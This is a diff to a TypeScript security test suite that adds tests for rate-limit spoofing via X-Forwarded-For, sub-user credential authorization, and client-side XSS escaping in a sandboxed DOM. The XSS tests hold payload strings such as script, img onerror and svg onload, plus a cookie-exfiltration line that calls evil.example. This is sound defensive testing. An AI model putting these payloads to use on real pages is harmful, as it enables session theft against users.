@@ -11,6 +11,7 @@ import http from 'http';
 import net from 'net';
 import os from 'os';
 import path from 'path';
+import vm from 'vm';
 import {
   inspectTarEntries,
   inspectZipEntries,
@@ -3205,11 +3206,11 @@ async function runSecurityTestSuite() {
       await new Promise<void>((resolve) => csprngSmtpServer.close(() => resolve()));
     }
 
-    // 15.3 Demo Login Rate Limiter (disabled 403, allowed below limit, 429 + Retry-After, proxy X-Forwarded-For isolation, normal auth unaffected)
+    // 15.3 Demo Login Rate Limiter — Default Direct Access Without Trusted Proxy (TRUST_PROXY unset -> false)
     const demoDisabledBurst = await request('/api/auth/demo-login', { method: 'POST' }, mainServer.baseUrl);
     assert(demoDisabledBurst.status === 403, 'DemoRate 15.3a: /api/auth/demo-login returns HTTP 403 when demo mode is disabled');
 
-    const demoRateSrv = await startIsolatedTestServer({
+    const demoDirectSrv = await startIsolatedTestServer({
       env: {
         ENABLE_DEMO_MODE: 'true'
       }
@@ -3223,99 +3224,1097 @@ async function runSecurityTestSuite() {
           method: 'POST',
           body: JSON.stringify({ name: 'Ordinary User', email: normalEmail, password: normalPass })
         },
-        demoRateSrv.baseUrl
+        demoDirectSrv.baseUrl
       );
-      assert(regOrdinary.status === 201, 'DemoRate 15.3b: Registered ordinary account for isolation verification');
+      assert(regOrdinary.status === 201, 'DemoRate 15.3b: Registered ordinary account for rate-limit isolation check');
 
-      // Direct client requests up to limit (5 requests succeed below limit)
+      // Task 2A: Send 5 requests with DIFFERENT forged X-Forwarded-For values directly without trusted proxy
       let allFiveOk = true;
       for (let i = 0; i < 5; i++) {
-        const res = await request('/api/auth/demo-login', { method: 'POST' }, demoRateSrv.baseUrl);
+        const res = await request(
+          '/api/auth/demo-login',
+          { method: 'POST', headers: { 'X-Forwarded-For': `203.0.113.${10 + i}` } },
+          demoDirectSrv.baseUrl
+        );
         if (res.status !== 200 || !res.body?.token || res.body?.user?.isDemo !== true) {
           allFiveOk = false;
         }
       }
       assert(allFiveOk, 'DemoRate 15.3c: Interactive demo login succeeds cleanly below configured rate limit (5/5 HTTP 200)');
 
-      // 6th request exceeds limit -> HTTP 429 + Retry-After header
-      const rateLimitedRes = await request('/api/auth/demo-login', { method: 'POST' }, demoRateSrv.baseUrl);
-      const retryAfterHeader = rateLimitedRes.headers.get('retry-after');
+      // 6th direct request with ANOTHER forged X-Forwarded-For MUST still be blocked with HTTP 429 + Retry-After
+      const directSpoofBlocked = await request(
+        '/api/auth/demo-login',
+        { method: 'POST', headers: { 'X-Forwarded-For': '203.0.113.250' } },
+        demoDirectSrv.baseUrl
+      );
+      const retryAfterHeader = directSpoofBlocked.headers.get('retry-after');
       const retryAfterSec = retryAfterHeader ? Number(retryAfterHeader) : NaN;
       assert(
-        rateLimitedRes.status === 429 &&
-        rateLimitedRes.body?.ok === false &&
+        directSpoofBlocked.status === 429 &&
+        directSpoofBlocked.body?.ok === false &&
         Number.isFinite(retryAfterSec) &&
         retryAfterSec >= 1 &&
         retryAfterSec <= 60,
-        'DemoRate 15.3d: Exceeding demo-login limit returns HTTP 429 with valid Retry-After response header'
+        'DemoRate 15.3d: Direct client rotating forged X-Forwarded-For cannot change effective IP or bypass limit (HTTP 429 + Retry-After)'
       );
 
-      // Trailing slash / case variant hits same normalized limiter bucket
-      const slashVariantRes = await request('/api/auth/demo-login/', { method: 'POST' }, demoRateSrv.baseUrl);
+      // Normalized path variant with yet another forged X-Forwarded-For is blocked under same bucket
+      const slashVariantRes = await request(
+        '/api/auth/demo-login/',
+        { method: 'POST', headers: { 'X-Forwarded-For': '198.51.100.250' } },
+        demoDirectSrv.baseUrl
+      );
       assert(
         slashVariantRes.status === 429 && !!slashVariantRes.headers.get('retry-after'),
-        'DemoRate 15.3e: Normalized path matching blocks /api/auth/demo-login/ variant under the same limit'
+        'DemoRate 15.3e: Normalized /api/auth/demo-login/ variant shares limiter bucket and returns HTTP 429'
       );
 
-      // Ordinary authentication on same IP is completely unaffected when demo-login is rate-limited
+      // Ordinary authentication on same IP stays completely unaffected
       const ordinaryLoginSameIp = await request(
         '/api/auth/login',
         { method: 'POST', body: JSON.stringify({ email: normalEmail, password: normalPass }) },
-        demoRateSrv.baseUrl
+        demoDirectSrv.baseUrl
       );
       assert(
         ordinaryLoginSameIp.status === 200 && !!ordinaryLoginSameIp.body?.token,
         'DemoRate 15.3f: Ordinary user login on same IP stays unaffected when demo-login is rate-limited (HTTP 200)'
       );
+    } finally {
+      await demoDirectSrv.stop(true);
+    }
 
-      // Behind proxy environment: Client A hitting 429 does NOT block Client B arriving via X-Forwarded-For
-      for (let i = 0; i < 5; i++) {
+    // 15.4 Explicit TRUST_PROXY Configurations & Simulated Trusted Reverse Proxy
+    const testDirectSpoofRejected = async (
+      trustProxyEnvValue: string,
+      testCode: string,
+      label: string,
+      expectWarning = false
+    ) => {
+      const srv = await startIsolatedTestServer({
+        env: {
+          ENABLE_DEMO_MODE: 'true',
+          TRUST_PROXY: trustProxyEnvValue
+        }
+      });
+      try {
+        for (let i = 0; i < 5; i++) {
+          const okRes = await request(
+            '/api/auth/demo-login',
+            { method: 'POST', headers: { 'X-Forwarded-For': `198.51.100.${1 + i}` } },
+            srv.baseUrl
+          );
+          if (okRes.status !== 200) {
+            throw new Error(`Expected HTTP 200 on request #${i + 1} for ${label}, got ${okRes.status}`);
+          }
+        }
+        const blockedRes = await request(
+          '/api/auth/demo-login',
+          { method: 'POST', headers: { 'X-Forwarded-For': '198.51.100.99' } },
+          srv.baseUrl
+        );
+        const warningLogged = (srv.stdout.join('') + srv.stderr.join('')).includes('TRUST_PROXY');
+        assert(
+          blockedRes.status === 429 &&
+          !!blockedRes.headers.get('retry-after') &&
+          (!expectWarning || warningLogged),
+          `${testCode}: ${label}`
+        );
+      } finally {
+        await srv.stop(true);
+      }
+    };
+
+    await testDirectSpoofRejected(
+      'false',
+      'ProxyCfg 15.4a',
+      'TRUST_PROXY=false ignores forged rotating X-Forwarded-For headers (HTTP 429)'
+    );
+    await testDirectSpoofRejected(
+      '0',
+      'ProxyCfg 15.4b',
+      'TRUST_PROXY=0 ignores forged rotating X-Forwarded-For headers (HTTP 429)'
+    );
+    await testDirectSpoofRejected(
+      'true',
+      'ProxyCfg 15.4c',
+      'Unsafe TRUST_PROXY=true logs warning and fails closed to trust proxy=false (HTTP 429)',
+      true
+    );
+    await testDirectSpoofRejected(
+      'invalid-proxy-setting!',
+      'ProxyCfg 15.4d',
+      'Invalid TRUST_PROXY value logs warning and fails closed to trust proxy=false (HTTP 429)',
+      true
+    );
+
+    // Task 2B: TRUST_PROXY=1 behind an actual HTTP reverse proxy appending genuine client IP
+    const proxiedSrv = await startIsolatedTestServer({
+      env: {
+        ENABLE_DEMO_MODE: 'true',
+        TRUST_PROXY: '1'
+      }
+    });
+
+    const targetOrigin = new URL(proxiedSrv.baseUrl);
+    const reverseProxyServer = http.createServer((clientReq, clientRes) => {
+      const simClientIp = String(clientReq.headers['x-test-sim-client-ip'] || '198.51.100.50');
+      const rawIncomingXff = clientReq.headers['x-forwarded-for'];
+      const incomingXffStr = Array.isArray(rawIncomingXff) ? rawIncomingXff.join(', ') : (rawIncomingXff || '');
+      const nextXff = incomingXffStr ? `${incomingXffStr}, ${simClientIp}` : simClientIp;
+
+      const forwardHeaders: Record<string, string | string[]> = {};
+      for (const [hKey, hVal] of Object.entries(clientReq.headers)) {
+        if (hVal === undefined) continue;
+        if (hKey === 'x-test-sim-client-ip' || hKey === 'host') continue;
+        forwardHeaders[hKey] = hVal;
+      }
+      forwardHeaders['host'] = targetOrigin.host;
+      forwardHeaders['x-forwarded-for'] = nextXff;
+      forwardHeaders['x-forwarded-proto'] = 'http';
+
+      const upstreamReq = http.request(
+        {
+          hostname: targetOrigin.hostname,
+          port: Number(targetOrigin.port),
+          path: clientReq.url,
+          method: clientReq.method,
+          headers: forwardHeaders
+        },
+        (upstreamRes) => {
+          clientRes.writeHead(upstreamRes.statusCode || 502, upstreamRes.headers);
+          upstreamRes.pipe(clientRes);
+        }
+      );
+      upstreamReq.on('error', (err) => {
+        clientRes.writeHead(502);
+        clientRes.end(err.message);
+      });
+      clientReq.pipe(upstreamReq);
+    });
+
+    await new Promise<void>((resolve) => reverseProxyServer.listen(0, '127.0.0.1', () => resolve()));
+    const proxyAddr = reverseProxyServer.address() as net.AddressInfo;
+    const proxyBaseUrl = `http://127.0.0.1:${proxyAddr.port}`;
+
+    try {
+      // Genuine Client A (198.51.100.51) sends 5 requests via reverse proxy while rotating forged leftmost X-Forwarded-For headers
+      const forgedLeftHeaders = ['10.0.0.1', '10.0.0.2', '127.0.0.1', '172.16.4.8', '203.0.113.77'];
+      let clientAAllowed = true;
+      for (const forgedLeft of forgedLeftHeaders) {
         const resA = await request(
           '/api/auth/demo-login',
-          { method: 'POST', headers: { 'X-Forwarded-For': '198.51.100.41' } },
-          demoRateSrv.baseUrl
+          {
+            method: 'POST',
+            headers: {
+              'X-Forwarded-For': forgedLeft,
+              'x-test-sim-client-ip': '198.51.100.51'
+            }
+          },
+          proxyBaseUrl
         );
-        assert(resA.status === 200, `DemoRate 15.3g.${i + 1}: Proxied Client A succeeds within its own bucket`);
+        if (resA.status !== 200 || !resA.body?.token) {
+          clientAAllowed = false;
+        }
       }
-      const blockedA = await request(
+      assert(clientAAllowed, 'ProxyCfg 15.4e: Proxied Client A succeeds for 5 requests within its limit behind TRUST_PROXY=1');
+
+      // 6th request from Client A ALSO rotates to a brand-new forged leftmost XFF ('192.0.2.88') -> MUST hit 429 on 198.51.100.51
+      const clientABlocked = await request(
         '/api/auth/demo-login',
-        { method: 'POST', headers: { 'X-Forwarded-For': '198.51.100.41' } },
-        demoRateSrv.baseUrl
+        {
+          method: 'POST',
+          headers: {
+            'X-Forwarded-For': '192.0.2.88',
+            'x-test-sim-client-ip': '198.51.100.51'
+          }
+        },
+        proxyBaseUrl
       );
       assert(
-        blockedA.status === 429 && !!blockedA.headers.get('retry-after'),
-        'DemoRate 15.3h: Proxied Client A triggers HTTP 429 + Retry-After upon exhausting limit'
+        clientABlocked.status === 429 && !!clientABlocked.headers.get('retry-after'),
+        'ProxyCfg 15.4f: Behind simulated trusted proxy (TRUST_PROXY=1), attacker rotating leftmost X-Forwarded-For still hits Client A bucket (HTTP 429 + Retry-After)'
       );
 
-      const allowedB = await request(
+      // Genuine Client B (198.51.100.52) via the same reverse proxy receives an independent bucket (even with same forged leftmost header!)
+      const clientBAllowed = await request(
         '/api/auth/demo-login',
-        { method: 'POST', headers: { 'X-Forwarded-For': '198.51.100.42' } },
-        demoRateSrv.baseUrl
+        {
+          method: 'POST',
+          headers: {
+            'X-Forwarded-For': '192.0.2.88',
+            'x-test-sim-client-ip': '198.51.100.52'
+          }
+        },
+        proxyBaseUrl
       );
       assert(
-        allowedB.status === 200 && !!allowedB.body?.token,
-        'DemoRate 15.3i: Proxied Client B (distinct X-Forwarded-For IP) remains unblocked behind reverse proxy'
-      );
-
-      // Verify proxy spoofing protection (with trust proxy=1, leftmost spoofed 127.0.0.1 is ignored when proxy appends real peer IP)
-      for (let i = 0; i < 5; i++) {
-        await request(
-          '/api/auth/demo-login',
-          { method: 'POST', headers: { 'X-Forwarded-For': '127.0.0.1, 203.0.113.99' } },
-          demoRateSrv.baseUrl
-        );
-      }
-      const spoofedBlocked = await request(
-        '/api/auth/demo-login',
-        { method: 'POST', headers: { 'X-Forwarded-For': '127.0.0.1, 203.0.113.99' } },
-        demoRateSrv.baseUrl
-      );
-      assert(
-        spoofedBlocked.status === 429,
-        'DemoRate 15.3j: Left-most X-Forwarded-For loopback spoofing behind 1 proxy hop cannot bypass demo rate limit (HTTP 429)'
+        clientBAllowed.status === 200 && !!clientBAllowed.body?.token,
+        'ProxyCfg 15.4g: Separate genuine Client B through same trusted proxy receives its own independent rate-limit bucket (HTTP 200)'
       );
     } finally {
-      await demoRateSrv.stop(true);
+      await new Promise<void>((resolve) => reverseProxyServer.close(() => resolve()));
+      await proxiedSrv.stop(true);
+    }
+
+    // 15.5 Sub-User Resend-Email Authorization & Credential-Disclosure Boundary vs Forgot-Password
+    const subCredSrv = await startIsolatedTestServer();
+    try {
+      const org1Email = `org1_owner_${Date.now()}@testcorp.local`;
+      const org2Email = `org2_owner_${Date.now()}@testcorp.local`;
+      const ownerPass = 'OrgOwnerStrong#2026!';
+
+      const regOrg1 = await request(
+        '/api/auth/register',
+        { method: 'POST', body: JSON.stringify({ name: 'Org1 Owner', email: org1Email, password: ownerPass }) },
+        subCredSrv.baseUrl
+      );
+      const regOrg2 = await request(
+        '/api/auth/register',
+        { method: 'POST', body: JSON.stringify({ name: 'Org2 Owner', email: org2Email, password: ownerPass }) },
+        subCredSrv.baseUrl
+      );
+      assert(regOrg1.status === 201 && regOrg2.status === 201, 'SubUserCred 15.5a: Registered two isolated workspace owners');
+
+      const org1Token = regOrg1.body.token;
+      const org2Token = regOrg2.body.token;
+
+      const subMemberEmail = `org1_member_${Date.now()}@testcorp.local`;
+      const createSubRes = await request(
+        '/api/auth/sub-users',
+        {
+          method: 'POST',
+          headers: { Authorization: `Bearer ${org1Token}` },
+          body: JSON.stringify({ name: 'Org1 Member', email: subMemberEmail, role: 'member' })
+        },
+        subCredSrv.baseUrl
+      );
+      assert(createSubRes.status === 201 && !!createSubRes.body?.subUser?.id, 'SubUserCred 15.5b: Org1 owner provisioned member sub-user');
+      const subId = createSubRes.body.subUser.id;
+      const initialSubPass = createSubRes.body.temporaryPassword;
+
+      const memberLoginRes = await request(
+        '/api/auth/login',
+        { method: 'POST', body: JSON.stringify({ email: subMemberEmail, password: initialSubPass }) },
+        subCredSrv.baseUrl
+      );
+      const memberToken = memberLoginRes.body.token;
+
+      // Unauthenticated resend-email rejected (401)
+      const unauthResend = await request(
+        `/api/auth/sub-users/${subId}/resend-email`,
+        { method: 'POST' },
+        subCredSrv.baseUrl
+      );
+      assert(
+        unauthResend.status === 401 && unauthResend.body?.temporaryPassword === undefined,
+        'SubUserCred 15.5c: Unauthenticated /api/auth/sub-users/:id/resend-email returns HTTP 401 with no credential'
+      );
+
+      // Same-org non-owner member rejected (403)
+      const memberResend = await request(
+        `/api/auth/sub-users/${subId}/resend-email`,
+        { method: 'POST', headers: { Authorization: `Bearer ${memberToken}` } },
+        subCredSrv.baseUrl
+      );
+      assert(
+        memberResend.status === 403 && memberResend.body?.temporaryPassword === undefined,
+        'SubUserCred 15.5d: Same-organization non-owner member cannot invoke resend-email or retrieve credentials (HTTP 403)'
+      );
+
+      // Cross-org owner rejected (403)
+      const crossOrgResend = await request(
+        `/api/auth/sub-users/${subId}/resend-email`,
+        { method: 'POST', headers: { Authorization: `Bearer ${org2Token}` } },
+        subCredSrv.baseUrl
+      );
+      assert(
+        crossOrgResend.status === 403 && crossOrgResend.body?.temporaryPassword === undefined,
+        'SubUserCred 15.5e: Cross-organization owner cannot invoke resend-email or retrieve another org credentials (HTTP 403)'
+      );
+
+      // Authorized parent owner succeeds, rotates CSPRNG temporaryPassword cleanly, outbox stays redacted, and prior member token is revoked
+      const ownerResend = await request(
+        `/api/auth/sub-users/${subId}/resend-email`,
+        { method: 'POST', headers: { Authorization: `Bearer ${org1Token}` } },
+        subCredSrv.baseUrl
+      );
+      const newSubTempPass = ownerResend.body?.temporaryPassword;
+      const diskAfterResend = fs.readFileSync(subCredSrv.dbFile, 'utf-8');
+      const subAuthWithRevoked = await request(
+        '/api/auth/me',
+        { headers: { Authorization: `Bearer ${memberToken}` } },
+        subCredSrv.baseUrl
+      );
+      const subLoginNewPass = await request(
+        '/api/auth/login',
+        { method: 'POST', body: JSON.stringify({ email: subMemberEmail, password: newSubTempPass }) },
+        subCredSrv.baseUrl
+      );
+      const unauthForgotRes = await request(
+        '/api/auth/forgot-password',
+        { method: 'POST', body: JSON.stringify({ email: subMemberEmail }) },
+        subCredSrv.baseUrl
+      );
+      assert(
+        ownerResend.status === 200 &&
+        typeof newSubTempPass === 'string' &&
+        /^Temp-[ABCDEFGHJKLMNPQRSTUVWXYZ23456789]{10}!$/.test(newSubTempPass) &&
+        newSubTempPass !== initialSubPass &&
+        !diskAfterResend.includes(newSubTempPass) &&
+        subAuthWithRevoked.status === 401 &&
+        subLoginNewPass.status === 200 &&
+        subLoginNewPass.body?.mustChangePassword === true &&
+        unauthForgotRes.status === 200 &&
+        unauthForgotRes.body?.temporaryPassword === undefined,
+        'SubUserCred 15.5f: Authorized parent receives rotated CSPRNG temporaryPassword while DB/outbox redact plaintext and /api/auth/forgot-password remains non-disclosing'
+      );
+    } finally {
+      await subCredSrv.stop(true);
+    }
+
+    // =========================================================================
+    // 16. Phase 1.1.2.3: Client XSS, Cloud Sync Transactions & Snapshot Pull
+    // =========================================================================
+    console.log('\n--- Test Category 16: Client XSS, Cloud Sync Transaction Hardening & Snapshot Pull ---');
+
+    const p1123Srv = await startIsolatedTestServer();
+    try {
+      // Lightweight DOM + Storage harness to execute real auth-manager.js and cloud-sync.js
+      function createMockDomEnv(initialStorage: Record<string, string> = {}) {
+        const storage = new Map<string, string>(Object.entries(initialStorage));
+        const localStorageMock = {
+          getItem: (k: string) => (storage.has(k) ? storage.get(k)! : null),
+          setItem: (k: string, v: string) => { storage.set(k, String(v)); },
+          removeItem: (k: string) => { storage.delete(k); },
+          clear: () => { storage.clear(); }
+        };
+
+        class MockClassList {
+          private classes = new Set<string>();
+          syncFromString(cls: string) {
+            this.classes = new Set(String(cls || '').split(/\s+/).filter(Boolean));
+          }
+          toString() {
+            return Array.from(this.classes).join(' ');
+          }
+          add(...tokens: string[]) { tokens.forEach(t => t && this.classes.add(t)); }
+          remove(...tokens: string[]) { tokens.forEach(t => this.classes.delete(t)); }
+          contains(token: string) { return this.classes.has(token); }
+          toggle(token: string, force?: boolean) {
+            if (force === true) { this.classes.add(token); return true; }
+            if (force === false) { this.classes.delete(token); return false; }
+            if (this.classes.has(token)) { this.classes.delete(token); return false; }
+            this.classes.add(token);
+            return true;
+          }
+        }
+
+        class MockElement {
+          tagName: string;
+          id = '';
+          type = '';
+          title = '';
+          src = '';
+          alt = '';
+          value = '';
+          disabled = false;
+          checked = false;
+          style: Record<string, any> = {};
+          dataset: Record<string, string> = {};
+          attributes: Record<string, string> = {};
+          children: MockElement[] = [];
+          listeners: Record<string, Array<(e?: any) => void>> = {};
+          classList = new MockClassList();
+          private _innerHtmlWritten = '';
+          private _textContent = '';
+
+          constructor(tagName: string) {
+            this.tagName = tagName.toUpperCase();
+          }
+
+          get className() { return this.classList.toString(); }
+          set className(val: string) { this.classList.syncFromString(val); }
+
+          get innerHTML() {
+            if (this._innerHtmlWritten) return this._innerHtmlWritten;
+            return this.children.map(c => c.outerMarkup()).join('');
+          }
+          set innerHTML(val: string) {
+            this._innerHtmlWritten = String(val ?? '');
+            this.children = [];
+            this._textContent = '';
+          }
+
+          get textContent(): string {
+            if (this.children.length > 0) {
+              return this._textContent + this.children.map(c => c.textContent).join('');
+            }
+            return this._textContent;
+          }
+          set textContent(val: string) {
+            this._innerHtmlWritten = '';
+            this.children = [];
+            this._textContent = String(val ?? '');
+          }
+
+          get innerText() { return this.textContent; }
+          set innerText(val: string) { this.textContent = val; }
+
+          appendChild(child: MockElement) {
+            this._innerHtmlWritten = '';
+            this.children.push(child);
+            return child;
+          }
+          replaceChildren(...nodes: MockElement[]) {
+            this._innerHtmlWritten = '';
+            this._textContent = '';
+            this.children = [...nodes];
+          }
+          addEventListener(evt: string, fn: (e?: any) => void) {
+            if (!this.listeners[evt]) this.listeners[evt] = [];
+            this.listeners[evt].push(fn);
+          }
+          click() {
+            (this.listeners['click'] || []).forEach(fn => fn({ target: this, preventDefault() {} }));
+          }
+          setAttribute(k: string, v: string) { this.attributes[k] = String(v); }
+          getAttribute(k: string) { return this.attributes[k] ?? null; }
+
+          outerMarkup(): string {
+            if (this.tagName === '#TEXT') {
+              return this._textContent
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;');
+            }
+            if (this.tagName === '#FRAGMENT') {
+              return this.children.map(c => c.outerMarkup()).join('');
+            }
+            const tag = this.tagName.toLowerCase();
+            const attrs: string[] = [];
+            if (this.src) attrs.push(`src="${this.src}"`);
+            if (this.alt) attrs.push(`alt="${this.alt}"`);
+            for (const [k, v] of Object.entries(this.attributes)) {
+              attrs.push(`${k}="${v}"`);
+            }
+            const attrStr = attrs.length ? ' ' + attrs.join(' ') : '';
+            const escapedText = this._textContent
+              .replace(/&/g, '&amp;')
+              .replace(/</g, '&lt;')
+              .replace(/>/g, '&gt;');
+            const childMarkup = this._innerHtmlWritten || (escapedText + this.children.map(c => c.outerMarkup()).join(''));
+            return `<${tag}${attrStr}>${childMarkup}</${tag}>`;
+          }
+
+          collectAllDescendants(): MockElement[] {
+            const out: MockElement[] = [];
+            const walk = (n: MockElement) => {
+              for (const c of n.children) {
+                out.push(c);
+                walk(c);
+              }
+            };
+            walk(this);
+            return out;
+          }
+        }
+
+        const elements = new Map<string, MockElement>();
+        const getOrCreateEl = (id: string, tag = 'div') => {
+          if (!elements.has(id)) {
+            const el = new MockElement(tag);
+            el.id = id;
+            elements.set(id, el);
+          }
+          return elements.get(id)!;
+        };
+
+        const bodyEl = new MockElement('body');
+        const documentMock: any = {
+          body: bodyEl,
+          activeElement: null,
+          createElement: (tag: string) => new MockElement(tag),
+          createTextNode: (text: string) => {
+            const t = new MockElement('#TEXT');
+            t.textContent = String(text ?? '');
+            return t;
+          },
+          createDocumentFragment: () => new MockElement('#FRAGMENT'),
+          getElementById: (id: string) => elements.get(id) || null,
+          querySelector: () => null,
+          querySelectorAll: () => [],
+          addEventListener: () => {},
+          removeEventListener: () => {}
+        };
+
+        const windowListeners: Record<string, Array<() => void>> = {};
+        const toasts: Array<{ msg: string; variant: string }> = [];
+        let nextConfirmResult = true;
+        let confirmCalls = 0;
+
+        const sandbox: any = {
+          console,
+          setTimeout: (fn: any) => 0,
+          clearTimeout: () => {},
+          setInterval: () => 0,
+          clearInterval: () => {},
+          Date,
+          JSON,
+          Math,
+          Object,
+          Array,
+          String,
+          Number,
+          Boolean,
+          Set,
+          Map,
+          RegExp,
+          Error,
+          Promise,
+          encodeURIComponent,
+          decodeURIComponent,
+          localStorage: localStorageMock,
+          document: documentMock,
+          fetch: async () => { throw new Error('Mock fetch not configured'); },
+          confirm: (_msg?: string) => { confirmCalls++; return nextConfirmResult; },
+          alert: () => {},
+          triggerToast: (msg: string, variant: string) => { toasts.push({ msg, variant }); },
+          addEventListener: (evt: string, fn: () => void) => {
+            if (!windowListeners[evt]) windowListeners[evt] = [];
+            windowListeners[evt].push(fn);
+          }
+        };
+        sandbox.window = sandbox;
+        sandbox.window.localStorage = localStorageMock;
+        sandbox.window.document = documentMock;
+        sandbox.window.confirm = sandbox.confirm;
+        sandbox.window.triggerToast = sandbox.triggerToast;
+        sandbox.window.addEventListener = sandbox.addEventListener;
+
+        return {
+          sandbox,
+          storage,
+          elements,
+          getOrCreateEl,
+          toasts,
+          setFetch: (fn: any) => { sandbox.fetch = fn; sandbox.window.fetch = fn; },
+          setConfirm: (val: boolean) => { nextConfirmResult = val; },
+          getConfirmCalls: () => confirmCalls,
+          resetConfirmCalls: () => { confirmCalls = 0; }
+        };
+      }
+
+      // 16.1 Execute real src/scripts/auth-manager.js against malicious XSS payloads
+      const xssPayloadName = `<img src=x onerror="window.__xss=1">' onclick="alert(9)"`;
+      const xssPayloadEmail = `bad+<script>window.__xss=2</script>@example.com`;
+      const xssPayloadPass = `Temp-<svg onload=alert(3)>!`;
+      const xssPayloadBody = `<script>fetch('https://evil.example/?c='+document.cookie)</script><img src=x onerror=alert(1)>`;
+
+      const authDom = createMockDomEnv({
+        forecaster_auth_token: 'tok_xss_test',
+        forecaster_auth_user: JSON.stringify({
+          id: 'usr_xss_owner',
+          name: `${xssPayloadName} User`,
+          email: xssPayloadEmail,
+          role: 'owner',
+          isPrimary: true,
+          avatarUrl: 'data:image/svg+xml,<svg onload=alert(1)>'
+        })
+      });
+
+      const subUsersListEl = authDom.getOrCreateEl('sub-users-list', 'div');
+      const subUsersCountEl = authDom.getOrCreateEl('sub-users-count-badge', 'span');
+      const dispatchedEmailsListEl = authDom.getOrCreateEl('dispatched-emails-list', 'div');
+      const adminOutboxListEl = authDom.getOrCreateEl('admin-outbox-list', 'div');
+      const previewCardEl = authDom.getOrCreateEl('sub-user-email-preview-card', 'div');
+      const subNameInputEl = authDom.getOrCreateEl('sub-user-name', 'input');
+      const subEmailInputEl = authDom.getOrCreateEl('sub-user-email', 'input');
+      const subSubmitBtnEl = authDom.getOrCreateEl('sub-user-submit-btn', 'button');
+      const avatarPreviewEl = authDom.getOrCreateEl('edit-profile-avatar-preview', 'div');
+      const headerAvatarEl = authDom.getOrCreateEl('header-profile-avatar', 'div');
+      const dropdownAvatarEl = authDom.getOrCreateEl('dropdown-user-avatar', 'div');
+      const headerLabelEl = authDom.getOrCreateEl('header-profile-label', 'span');
+      const dropdownNameEl = authDom.getOrCreateEl('dropdown-user-name', 'div');
+      const dropdownEmailEl = authDom.getOrCreateEl('dropdown-user-email', 'div');
+
+      const authScriptCode = fs.readFileSync(path.resolve(process.cwd(), 'src/scripts/auth-manager.js'), 'utf-8');
+      vm.runInNewContext(authScriptCode, authDom.sandbox);
+
+      const authActionsCalled: string[] = [];
+      authDom.setFetch(async (url: string, opts?: any) => {
+        if (url === '/api/auth/sub-users' && (!opts?.method || opts.method === 'GET')) {
+          return {
+            ok: true,
+            status: 200,
+            json: async () => ({
+              ok: true,
+              subUsers: [{
+                id: `sub_id_'_"_<script>`,
+                name: xssPayloadName,
+                email: xssPayloadEmail,
+                role: 'member',
+                mustChangePassword: true,
+                temporaryPassword: xssPayloadPass
+              }]
+            })
+          };
+        }
+        if (url === '/api/auth/sub-users' && opts?.method === 'POST') {
+          return {
+            ok: true,
+            status: 201,
+            json: async () => ({
+              ok: true,
+              subUser: { id: 'sub_created_1', name: xssPayloadName, email: xssPayloadEmail, role: `<script>alert(1)</script>` },
+              temporaryPassword: xssPayloadPass,
+              email: { sent: true }
+            })
+          };
+        }
+        if (url === '/api/emails/outbox') {
+          return {
+            ok: true,
+            status: 200,
+            json: async () => ({
+              ok: true,
+              outbox: [{
+                subject: `<img src=x onerror=alert(1)>`,
+                toName: xssPayloadName,
+                to: xssPayloadEmail,
+                sentAt: '2026-11-16T00:00:00.000Z',
+                body: xssPayloadBody
+              }]
+            })
+          };
+        }
+        if (String(url).includes('/resend-email')) {
+          authActionsCalled.push('resend');
+          return { ok: true, status: 200, json: async () => ({ ok: true }) };
+        }
+        return { ok: false, status: 404, json: async () => ({ ok: false, error: '<script>err</script>' }) };
+      });
+
+      await authDom.sandbox.window.ForecasterAuth.loadSubUsers();
+      const subMarkup = subUsersListEl.innerHTML;
+      const subDescendants = subUsersListEl.collectAllDescendants();
+      const resendBtn = subDescendants.find(el => el.dataset.action === 'resend-subuser');
+      const deleteBtn = subDescendants.find(el => el.dataset.action === 'delete-subuser');
+      const hasDangerousTag = subDescendants.some(el => ['SCRIPT', 'IMG', 'SVG', 'IFRAME'].includes(el.tagName));
+      const hasInlineHandlerAttr =
+        /<[a-z][^>]*\son[a-z]+\s*=/i.test(subMarkup) ||
+        subDescendants.some(el => Object.keys(el.attributes).some(k => k.toLowerCase().startsWith('on')));
+      if (resendBtn) resendBtn.click();
+
+      assert(
+        !subMarkup.includes('<script') &&
+        !subMarkup.includes('<img') &&
+        !subMarkup.includes('<svg') &&
+        !hasDangerousTag &&
+        !hasInlineHandlerAttr &&
+        subUsersListEl.textContent.includes(xssPayloadName) &&
+        subUsersListEl.textContent.includes(xssPayloadEmail) &&
+        subUsersListEl.textContent.includes(xssPayloadPass) &&
+        subUsersCountEl.textContent === '1' &&
+        !!resendBtn &&
+        !!deleteBtn &&
+        (resendBtn?.listeners['click']?.length || 0) === 1 &&
+        (deleteBtn?.listeners['click']?.length || 0) === 1 &&
+        authActionsCalled.includes('resend'),
+        'XSS 16.1a: loadSubUsers builds safe DOM nodes with textContent and event listeners (zero inline onclick or unescaped HTML)',
+        `hasDangerousTag=${hasDangerousTag} hasInlineHandlerAttr=${hasInlineHandlerAttr} actions=${authActionsCalled.join(',')}`
+      );
+
+      await authDom.sandbox.window.ForecasterAuth.loadDispatchedEmails();
+      const dispatchedMarkup = dispatchedEmailsListEl.innerHTML;
+      assert(
+        !dispatchedMarkup.includes('<script') &&
+        !dispatchedMarkup.includes('<img') &&
+        dispatchedEmailsListEl.textContent.includes('<img src=x onerror=alert(1)>') &&
+        dispatchedEmailsListEl.textContent.includes(xssPayloadBody),
+        'XSS 16.1b: loadDispatchedEmails neutralizes HTML/JS in subject, recipient, and email body using textContent'
+      );
+
+      authDom.sandbox.window.ForecasterAuth.renderAdminOutbox([{
+        status: '<script>s</script>',
+        subject: '<img src=x onerror=alert(1)>',
+        to: xssPayloadEmail,
+        kind: '<svg onload=alert(2)>',
+        deliveryProvider: 'smtp<b>x</b>',
+        deliveryError: '<script>alert(3)</script>',
+        sentAt: '2026-11-16T00:00:00.000Z'
+      }]);
+      const adminOutboxMarkup = adminOutboxListEl.innerHTML;
+      assert(
+        !adminOutboxMarkup.includes('<script') &&
+        !adminOutboxMarkup.includes('<img') &&
+        !adminOutboxMarkup.includes('<svg') &&
+        adminOutboxListEl.textContent.includes('<script>alert(3)</script>'),
+        'XSS 16.1c: renderAdminOutbox renders outbox rows purely via safe DOM nodes'
+      );
+
+      subNameInputEl.value = xssPayloadName;
+      subEmailInputEl.value = xssPayloadEmail;
+      await authDom.sandbox.window.ForecasterAuth.handleCreateSubUserSubmit({ preventDefault() {} });
+      const previewMarkup = previewCardEl.innerHTML;
+      assert(
+        !previewMarkup.includes('<script') &&
